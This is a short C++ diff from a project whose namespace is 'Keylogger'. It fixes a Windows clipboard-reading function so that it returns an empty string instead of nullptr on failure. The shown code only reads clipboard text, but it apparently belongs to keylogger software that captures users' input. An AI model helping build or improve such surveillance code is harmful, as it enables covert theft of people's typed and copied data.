@@ -8,15 +8,15 @@ namespace Keylogger {
 
 std::string ClipboardHandlerWindows::getClipboardString() {
     if (!OpenClipboard(nullptr))
-        return nullptr;
+        return "";
 
     HANDLE hData = GetClipboardData(CF_TEXT);
     if (hData == nullptr)
-        return nullptr;
+        return "";
 
     char* chtext = static_cast<char*>(GlobalLock(hData));
     if (chtext == nullptr)
-        return nullptr;
+        return "";
 
     std::string text(chtext);
 
